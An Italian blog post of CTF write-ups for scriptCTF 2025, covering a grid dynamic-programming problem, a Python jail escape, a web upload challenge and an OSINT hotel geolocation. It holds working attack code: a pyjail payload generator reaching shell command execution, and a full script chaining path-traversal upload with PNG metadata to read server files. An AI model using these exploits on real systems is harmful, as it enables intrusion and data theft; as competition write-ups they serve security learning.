---
title: "scriptCTF 2025"
date: 2025-08-22T00:00:00+00:00
# weight: 1
# aliases: \["/first"]
tags: ["scriptctf", "ctf", "web", "programming", "pyjail", "osint"]
author: ["Ale18V", "AlBovo", "katchup"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Tutti i writeup di scriptCTF 2025"
canonicalURL: "https://albovo.github.io/en/ctf/"
disableHLJS: false # to enable highlightjs
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
math: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups" # image path/url
    alt: "scriptCTF 2025" # alt text
    caption: "Tutti i writeup di scriptCTF 2025." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "[https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en](https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en)"
    Text: "Suggerisci modifiche" # edit text
    appendFilePath: true # to append file path to Edit link
---

# scriptCTF 2025 🚩

![logo scriptctf](/images/scriptctf.png)

## Back From Where 💻

### Testo del problema

Il problema si può formulare così:

*Ti viene data una griglia $N \times N$ di interi $a_{ij}$. Un percorso è considerato valido se parte dall’angolo in alto a sinistra e si muove solo verso il basso o verso destra. Per ogni cella $(i,j)$ trova il numero massimo di zeri finali nel prodotto dei valori lungo un qualsiasi percorso valido.*

### Writeup 📜

#### Numero di zeri finali

La prima domanda è come calcolare in pratica il numero di zeri finali di un numero $m$. La risposta è abbastanza diretta: troviamo quante volte $m$ è divisibile per $5$ e per $2$; il numero di zeri finali corrisponde a quante coppie di cinque e due possiamo abbinare. Supponiamo che $m$ sia divisibile per cinque $c$ volte e per due $d$ volte, allora il numero di zeri finali è $\min(c, d)$.

#### Primo tentativo

La mia idea iniziale per risolvere questo problema era usare un approccio di *programmazione dinamica*.

La prima idea che mi è venuta in mente è stata di memorizzare per ogni cella una coppia `<c, d>` dove `c` è il numero di **c**inque accumulati fino a quella cella e `d` è il numero di **d**ue. In ogni cella esploreremmo i vicini e controlleremmo quale scelta produce il numero più alto di zeri finali. L’idea era chiaramente insensata, perché non possiamo massimizzare entrambi contemporaneamente. Ma questo mi ha portato a un’intuizione importante.

#### Un’idea migliore

*E se invece fissassi uno dei due e massimizzassi l’altro?* Questo è infatti possibile.

Sia `dp[i][j][c]` il numero massimo di due che possiamo accumulare in un qualsiasi percorso dalla cella in alto a sinistra alla cella $(i,j)$ con almeno $c$ cinque.

Sia $a_{ij}$ il valore della cella $(i, j)$, che nella sua fattorizzazione contiene $5^{C}$ e $2^{D}$.

Allora:

```cpp
dp[i][j][c] = max(dp[i-1][j][max(c - C, 0)], dp[i][j-1][max(c - C, 0)]) + D

```

Questo in generale funziona ma dobbiamo gestire la prima colonna e la prima riga in modo diverso per evitare accessi fuori indice, quindi:

```cpp
dp[0][j][c] = dp[0][j-1][max(c-C, 0)] + D (con j > 0)
dp[i][0][c] = dp[i-1][0][max(c-C, 0)] + D (con i > 0)
```

E l’inizializzazione della cella $(0, 0)$ si fa così:

```cpp
// numero di [cinque, due] nella fattorizzazione della cella (0,0)
auto [c, d] = divs[g[0][0]];
for (int q = 0; q <= c; q++)
	 // è possibile arrivare qua con `q` cinque
	 dp[q][0][0] = d;

```

La soluzione per la cella $(i, j)$ può essere calcolata mentre aggiorniamo `dp`:

```cpp
for(int q = 0; q < B; q++) {
	...
	n_trailing_zeroes = min(q, dp[q][i][j]);
	ans[i][j] = max(ans[i][j], n_trailing_zeroes);
	...
}
```

#### Correttezza della soluzione

Come teniamo conto della possibilità che non esista alcun percorso tale da raggiungere la cella $(i, j)$ con $c$ cinque? L’array `dp` viene inizializzato a meno infinito. Quando eseguiamo la programmazione dinamica sull’array, solo i percorsi con un numero legale di cinque si propagheranno.

Come esempio concreto, supponiamo $a_{00} = 5$ e $a_{01} = 4$. Allora, secondo l’inizializzazione sopra:

```cpp
dp[0][0][0] = 1
dp[0][0][1] = 1
```

Il resto sarà:

```cpp
dp[0][0][2] = -INF
... = -INF
```

Quindi, se esploriamo la cella $(0, 1)$ assumendo `c = 2`, allora:

```cpp
dp[0][1][0] = dp[0][0][max(2-0, 0)] + 2 = dp[0][0][2] + 2 = -INF + 2 = -INF
```

##### Complessità temporale

Infine, la complessità dell’algoritmo è accettabile?
Chiamiamo $B$ il limite sul numero di cinque in un qualsiasi percorso. Sappiamo che non ha senso calcolare `dp[i][j][c]` con `c > B`, perché nessun percorso può avere più di $B$ cinque. La complessità dell’algoritmo sarebbe $O(B \times N^{2})$.
Sia $A$ il limite sui valori contenuti nelle celle; segue che nessun valore $a_{ij}$ può contenere più di $\log_{5}(A)$ cinque nella sua fattorizzazione.
Il percorso valido più lungo nella griglia ha lunghezza $2N$, dunque il limite sul numero totale di cinque nella fattorizzazione del prodotto lungo qualsiasi percorso è $2N\log_{5} A$.
Se guardiamo il codice del server che genera la griglia:

```py
n = 100

grid_lines = []
for _ in range(n):
    row = []
    for _ in range(n):
        flip = random.randint(1, 2)
        if flip == 1:
            row.append(str(random.randint(1, 696) * 2))
        else:
            row.append(str(random.randint(1, 696) * 5))
    grid_lines.append(' '.join(row))
```

Vediamo che `A = max(696 * 2, 696 * 5) = 3480`, che arrotondiamo a 5000. Dato che $\log_{5}(5000) = \log_{5}(A) \approx 5{,}3$, per cella non si possono aggiungere più di $5$ cinque.
La complessità è dunque $O(2N^{3}\log_{5}(A))$. Sostituendo i vincoli su $A$ e $N$, significa praticamente circa $100^3 * 10 = 10^7$ operazioni, che è veloce.

### Soluzione completa

```cpp
#include <bits/stdc++.h>
using namespace std;
constexpr int N = 100;
constexpr int MAXV = 5000;
constexpr int B = 10*N;
#define INF (1e9)
constexpr array<pair<int, int>, MAXV> divs = []() consteval {
    array<pair<int, int>, MAXV> res;
    for (int i = 1; i < MAXV; i++) {
        res[i] = {0, 0};
        int j = i;
        while (j % 2 == 0) {
            res[i].second++;
            j = j >> 1;
        }

        while (j % 5 == 0) {
            res[i].first++;
            j = j/5;
        }
    }
    return res;
}();

int main() {
    vector<vector<int>> g(N, vector<int>(N, 0));

    for (auto &row : g) {
        for (auto &e : row) {
            cin >> e;
        }
    }
    vector<vector<int>> ans(N, vector<int>(N, 0));
    vector<vector<vector<int>>> dp(B, vector<vector<int>>(N, vector<int>(N, -INF)));
    auto [c, d] = divs[g[0][0]];
    ans[0][0] = min(c, d);
    for (int q = 0; q <= c; q++) {
        dp[q][0][0] = d;
    }

    for (int q = 0; q < B; q++) {
        for (int i = 1; i < N; i++) {
            auto [c, d] = divs[g[i][0]];
            dp[q][i][0] = dp[max(q - c, 0)][i - 1][0] + d;
            ans[i][0] = max(ans[i][0], min(q, dp[q][i][0]));
        }

        for (int j = 1; j < N; j++) {
            auto [c, d] = divs[g[0][j]];
            dp[q][0][j] = dp[max(q - c, 0)][0][j - 1] + d;
            ans[0][j] = max(ans[0][j], min(q, dp[q][0][j]));
        }

        for (int i = 1; i < N; i++) {
            for (int j = 1; j < N; j++) {
                auto [c, d] = divs[g[i][j]];
                dp[q][i][j] = max(dp[max(q - c, 0)][i - 1][j], dp[max(q - c, 0)][i][j - 1]) + d;
                ans[i][j] = max(ans[i][j], min(q, dp[q][i][j]));
            }
        }
    }

    for (auto &row : ans) {
        for (auto &v : row) {
            cout << v << " ";
        }
        cout << endl;
    }
}
```

## Modulo 🐍

Ecco una bozza di writeup rifinita che puoi adattare per il blog del team o per la submission del CTF. L’ho mantenuta coinvolgente ma tecnica e ho evidenziato la progressione del ragionamento (inclusi i “vicoli ciechi”), perché spesso è ciò che gli organizzatori apprezzano di più.

### Riepilogo della challenge

Ci è stata fornita la seguente pyjail:

```python
import ast
print("Welcome to the jail! You're never gonna escape!")
payload = input("Enter payload: ") # No uppercase needed
blacklist = list("abdefghijklmnopqrstuvwxyz1234567890\\;._")
for i in payload:
    assert ord(i) >= 32
    assert ord(i) <= 127
    assert (payload.count('>') + payload.count('<')) <= 1
    assert payload.count('=') <= 1
    assert i not in blacklist

tree = ast.parse(payload)
for node in ast.walk(tree):
    if isinstance(node, ast.BinOp):
        if not isinstance(node.op, ast.Mod):
            raise ValueError("I don't like math :(")
exec(payload,{'__builtins__':{},'c':getattr})
print('Bye!')
```

**Restrizioni:**

* Tutte le minuscole sono nella blacklist tranne `c`.
* Niente cifre, niente **underscore**, niente **punti**, niente backslash.
* Al massimo un `<` e un `=` in tutto il payload.
* L’unico operatore binario consentito è `%`.
* Il contesto di esecuzione non ha builtins, solo `c = getattr`.

### Prima impressione

La prima cosa che ho notato è che nel codice della challenge non c’era alcun indizio di una flag.
L’obiettivo era chiaramente ottenere una RCE.

La procedura tipica per affrontare le pyjail è la seguente:

1. Usare `object.__subclasses__()` per raggiungere classi pericolose.
2. Trovarne una la cui `__init__.__globals__` contenga `__builtins__`.
3. Da lì, chiamare `__import__('os').system('cat flag')`.

Il carattere `.` era in blacklist ma avevamo accesso a `getattribute` tramite il carattere `c`.
I veri problemi erano che l’underscore era in blacklist e i builtins erano vuoti.

### Un’altra variabile chiave

Esiste un’altra variabile importante simile ai builtins: `__globals__`.

`__globals__` è associata a ogni oggetto funzione Python ed è il dizionario effettivamente usato come spazio dei nomi globale quando la funzione gira.

Accedervi aggira il fatto che a `exec` è stato passato `__builtins__ = {}`. Non ci interessa più, se riusciamo a trovare una funzione da un modulo i cui globals contengano già riferimenti potenti.

Entra in scena l’eroe: `importlib._bootstrap.ModuleSpec`.

La sua `__globals__` include `sys`, e da lì si può raggiungere `sys.modules['posix']` e la sua funzione `system` per eseguire comandi di shell.

Questo evita del tutto di toccare i builtins.

### Aggirare i filtri

#### **Forgiare interi senza cifre**:

Possiamo ottenere `False` con l’espressione `[] < []`. Poiché ci è permesso usare un `=` singolo, possiamo assegnarlo a una variabile: `X := []<[]`.

Ricorda che solo gli operatori binari sono bloccati, ma possiamo ottenere qualsiasi numero da `X` usando solo operatori unari:

* Possiamo capovolgere il segno di un numero e diminuire di uno usando l’operatore `~` (ad es. `~0` = `-1`)
* Capovolgere il segno usando l’operatore `-`.
  Anche se `X` è in realtà `False` e non `0`, con questi operatori il valore viene interpretato come intero.
  Per esempio, per ottenere `3` possiamo usare `-~(-~(-~X))`.

Questa è la primitiva che abbiamo definito per generare numeri:

```python
def define_zero() -> str:
    # exactly one '=' and one '<' in the whole payload
    return "(X:=[]<[])"
```

```python
@lru_cache(maxsize=None)
def n_expr(n: int) -> str:
    """
    Build an integer expression using only:
      - X (assumed 0)
      - unary operators ~ and -~
    No digits in source.
    """
    if n == 0:
        return "X"
    if n == -1:
        return "~X"
    return "(" + "-~" * n + "X" + ")"
```

#### **Evochiamo stringhe senza lettere**:

È poco noto ma l’operatore binario `%`, se applicato a una stringa, può essere usato per formattare stringhe, in modo analogo a `printf` in C.
Lo specificatore `%c` è notevole perché formatta un carattere a partire dal codepoint, cioè dall’ASCII per quello che ci serve. Per esempio, il codepoint dell’underscore è 95, quindi `"%c" % 95 = "_"`.
A questo punto possiamo costruire qualunque numero e qualunque stringa.

Questa è la primitiva che abbiamo usato per costruire stringhe arbitrarie:

```python
def str_expr(s: str) -> str:
    """
    Build a string literal via "%c"*k % (codepoints...),
    where each codepoint is built via n_expr.
    Only % as BinOp; no forbidden letters in source.
    """
    parts = [n_expr(ord(ch)) for ch in s]
    return '"' + ("%c" * len(parts)) + '"%(' + ",".join(parts) + ")"
```

### Exploit

L’exploit consiste in due parti:

1. Accesso a ModuleSpec (Probe)
2. RCE (Exec)

#### Sondaggio

Tutte le classi in Python ereditano da `object` e ogni classe ha un attributo `__subclasses__`. Possiamo quindi raggiungere `ModuleSpec` da lì. La domanda è come arrivare a `object`.

Qui entra in gioco `__mro__`. Ogni classe in Python ha l’attributo `__mro__`, la *method resolution order*. È una tupla di classi che Python esplora quando cerca attributi. Per esempio, usando `c` alias `getattr`:

```python
>>> getattr.__class__
<class 'builtin_function_or_method'>
>>> getattr.__class__.__mro__
(<class 'builtin_function_or_method'>, <class 'object'>)
```

Quindi `getattr.__class__.__mro__[-1]` ci dà `object`, e poi `object.__subclasses__()` ci dà l’intera lista di sottoclassi, inclusa `ModuleSpec`.

C’è però ancora un ostacolo:

```
>>> len(getattr.__class__.__mro__[-1].__subclasses__())
286
```

Come facciamo a sapere dove si trova `ModuleSpec`? Non abbiamo accesso a `print`, quindi non possiamo stamparle una per una. Nei test locali abbiamo avuto successo con il seguente approccio:

```python
def probe_payload(i: int) -> str:
    """
    Raises KeyError with the name of object.__subclasses__()[i],
    leaking the class name via traceback.
    """
    NAME = str_expr("__name__")
    subs = subclasses_list_expr()
    idx  = n_expr(i)
    return f"({define_zero()},{{}}[c({subs}[{idx}],{NAME})])"
```

L’idea è prendere `subclasses()[i]` e usare quello come chiave per accedere a un dizionario vuoto. Questo lancerà una KeyError e farà filtrare il nome della classe. Abbiamo testato localmente usando la utility `process` di `pwntools`.
Tuttavia, provando in remoto non vedevamo nulla perché mancava `stderr`.
Ci siamo ricordati del Dockerfile, abbiamo costruito l’immagine e testato il `probe` in quel container, dove potevamo vedere i log su `stderr`. La logica era che l’immagine fosse la stessa, quindi l’indice di `ModuleSpec` non sarebbe cambiato.

Abbiamo sondato gli indici tra `0` e `200` e trovato `ModuleSpec` attorno a indice `100`.

#### RCE

Ora che abbiamo accesso a `ModuleSpec` possiamo accedere a `__globals__` e a `sys` ed eseguire comandi arbitrari di shell:

```python
def exec_payload(idx: int, cmd: str) -> str:
    """
    Execute via: ModuleSpec.__init__.__globals__['sys'].modules['posix'].system(cmd)
    """
    subs = subclasses_list_expr()
    INIT = str_expr("__init__")
    GLOB = str_expr("__globals__")
    SYS  = str_expr("sys")
    MODS = str_expr("modules")
    POSX = str_expr("posix")
    SYSF = str_expr("system")
    CMD  = str_expr(cmd)
    IDX  = n_expr(idx)

    sys = f"(c(c({subs}[{IDX}],{INIT}),{GLOB})[{SYS}])"
    posix = f"(c({sys},{MODS})[{POSX}])"
    return (
        f"({define_zero()},c({posix},{SYSF})({CMD}))"
    )
```

Dopo un po’ di esplorazione con `ls` abbiamo trovato un file chiamato `flag.txt` e lo abbiamo esfiltrato con un semplice `cat`.

## Wizard Gallery 🌐

Quando avviamo il servizio notiamo un upload di immagini che si fida del **nome file fornito dal client** e una route separata che serve una **miniatura “logo”**. Questo basta per tentare due classici trucchi: path traversal sull’upload e “magie” nei metadati sulla thumbnail.

### Percorso dell’exploit

Per spiegare l’exploit dobbiamo analizzare il sorgente; lì abbiamo trovato alcune cose utili per compromettere il servizio.

* L’uploader accetta nomi file arbitrari; `../logo.png` finisce **fuori** dalla cartella prevista, permettendoci di sovrascrivere il `logo.png` principale del sito.
* Il generatore della miniatura che serve `logo-sm.png` **legge i metadati PNG** (una chiave `tEXt` chiamata `profile`) e sembra **dereferenziarla come percorso locale** mentre genera il logo piccolo.

```python
@app.route('/uploads/<filename>')
def uploaded_file(filename):
   # Make sure to handle the case where the file is logo-sm.png (not part of the vault)
   if filename == 'logo-sm.png':
      return "File not found", 404
   return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

# Serve all files from public to /
@app.route('/<path:filename>')
def serve_files(filename):
   try:
      return send_from_directory(PUBLIC_DIR, filename)
   except:
      return "File not found", 404
```

Una volta capito bene dove risiedevano le vulnerabilità, non restava che scrivere uno script Python che:

```python
@app.route('/logo-sm.png')
def logo_small():
   # A smaller images looks better on mobile so I just resize it and serve that
   logo_sm_path = os.path.join(app.config['UPLOAD_FOLDER'], 'logo-sm.png')
   if not os.path.exists(logo_sm_path):
      os.system("magick/bin/convert logo.png -resize 10% " + os.path.join(app.config['UPLOAD_FOLDER'], 'logo-sm.png'))
    
   return send_from_directory(app.config['UPLOAD_FOLDER'], 'logo-sm.png')
```

1. **Crei un PNG** con un chunk `tEXt`: `profile=/home/chall/flag.txt`.
   (Qualsiasi piccolo PNG valido va bene; la chiave è il chunk di testo `profile`.)
2. **Sovrascrivi il logo reale** caricando quel PNG ma chiamandolo `../logo.png` nel campo del form.
   (Si abusa del path traversal per sostituire il file che il sito poi ridimensiona.)
3. **Attivi l’elaborazione** richiedendo il logo piccolo (es. `/logo-sm.png`).
   La pipeline di immagini legge il valore di `profile` e **incorpora i byte del file** nello stream dell’immagine in uscita.
4. **Esfiltri** scaricando il PNG restituito ed estraendo sequenze esadecimali lunghe dallo stream di byte; le concateni, fai l’`hex-decode` e recuperi il segreto.
5. **La flag** è esattamente il contenuto di `flag.txt` prodotto dallo step 4 (stampato dallo script di supporto).

### Test “one-liner”

È anche possibile fare:

* **Upload (traversal):** `filename=../logo.png` con il tuo PNG costruito come body.
* **Fetch:** `GET /logo-sm.png` -> salvi la risposta -> regex su `[a-f0-9]{5,}`, concateni, `bytes.fromhex(...).decode()`.

### Automazione

Eseguire `python3 solve.py <HOST> <PORT>` fa tutti gli step: costruisce il PNG malevolo con il chunk `profile`, sovrascrive `logo.png`, scarica `logo-sm.png`, estrae sequenze esadecimali dalla risposta, decodifica e **stampa la flag**. (Artefatti: `final_exploit.png` e `final_output.png` per ispezione.)

**Submission finale:** la stringa esatta prodotta dallo step di decodifica (contenuto di `flag.txt`).

**P.S.**: Per trovare il percorso effettivo della flag abbiamo fatto crashare il server per ottenere la pagina di Debug di Flask (`debug=True`).

### Exploit

```python
#!/usr/bin/env python3
import requests
from PIL import Image, PngImagePlugin
import os
import time
import re
import sys

MALICIOUS_PNG_PATH = "final_exploit.png"
OUTPUT_PNG_PATH = "final_output.png"

def create_png(file_to_read):
    img = Image.new("RGB", (10, 10), color="black")
    info = PngImagePlugin.PngInfo()
    info.add_text("profile", file_to_read)
    img.save(MALICIOUS_PNG_PATH, "PNG", pnginfo=info)


def reset_server_cache(upload_url):
    with open("reset_file", "w") as f:
        f.write("reset")
    files = {"file": ("reset", open("reset_file", "rb"), "application/octet-stream")}
    requests.post(upload_url, files=files, timeout=10)
    os.remove("reset_file")
    time.sleep(1)


def main():
    base_url = f"http://{sys.argv[1]}:{sys.argv[2]}" # python solve.py host port
    upload_url = f"{base_url}/upload"
    logo_sm_url = f"{base_url}/logo-sm.png"

    reset_server_cache(upload_url)
    create_png("/home/chall/flag.txt")

    files = {"file": ("../logo.png", open(MALICIOUS_PNG_PATH, "rb"), "image/png")}
    requests.post(upload_url, files=files, timeout=15).raise_for_status()
    requests.get(logo_sm_url, timeout=10)
    time.sleep(2)

    response = requests.get(logo_sm_url, timeout=15)
    response.raise_for_status()
    with open(OUTPUT_PNG_PATH, "wb") as f:
        f.write(response.content)

    flag_dec = ''
    for flag in re.findall(r'[a-f0-9]+'.encode(), response.content):
        if len(flag) > 4:
            flag_dec += flag.decode()
    print(bytes.fromhex(flag_dec).decode().strip())

if __name__ == "__main__":
    main()
```

## Insider 4 🔎

### Introduzione

Quando apriamo la cartella `.insider-4` ([https://github.com/scriptCTF/scriptCTF26/tree/main/OSINT/.insider-4/attachments](https://github.com/scriptCTF/scriptCTF26/tree/main/OSINT/.insider-4/attachments)), vediamo `fireworks.jpg`, `room.jpg` e un file `.secret` che nota come il fotografo aggiunga commenti alle sue immagini. Questo ci indirizza subito ai metadati nascosti.

### Analisi

Usando **exiftool** sulle immagini, in `fireworks.jpg` troviamo un commento sulla *famiglia Wendell* che organizza fuochi d’artificio. [Una rapida ricerca](https://wendellfamilyfireworks.com/places-to-eat-stay-watch/) mostra che la famiglia Wendell tiene ogni anno fuochi d’artificio a Rockport, Texas. Questo restringe la località della vacanza all’area di Rockport.

Poi controlliamo la seconda immagine, `room.jpg`. È chiaramente una foto scattata dal balcone di una camera d’albergo con vista diretta sul mare. Sapendo che i fuochi d’artificio avvengono a Rockport, apriamo Google Maps, scriviamo “hotel” lungo il lungomare e iniziamo a confrontare balconi e struttura generale. Dopo un po’ di avanti e indietro con Street View, la corrispondenza è evidente: **Days Inn by Wyndham Rockport, 901 Hwy 35 N, Rockport, TX 78382** ([`https://maps.app.goo.gl/sSV1KWFeVUWauTWZ9`](https://maps.app.goo.gl/sSV1KWFeVUWauTWZ9)).

Resta da capire il numero della stanza. Poiché la challenge suggeriva che non sarebbe servito un brute force infinito, abbiamo pensato di controllare **recensioni e foto dei clienti su Google Maps**, dato che la gente ama postare immagini delle stanze. Scorrendo le foto, incappiamo in un’immagine con i numeri **115** e **116** uno accanto all’altro. Abbiamo osservato che i numeri di stanza decrescono andando verso la parte dell’edificio che combacia con la vista dal nostro balcone in `room.jpg`. Questo significa che la stanza target dovrebbe essere un po’ più in basso di 115.

Testiamo un piccolo intervallo: 114, 113, 112, 111, ecc. E la **111** è quella giusta.

La flag richiede indirizzo più numero di stanza, formattati come nell’esempio. L’indirizzo dell’hotel è `901 Hwy 35 N`, quindi la submission finale è:

```
scriptCTF{901_Hwy_35_N_111}
```
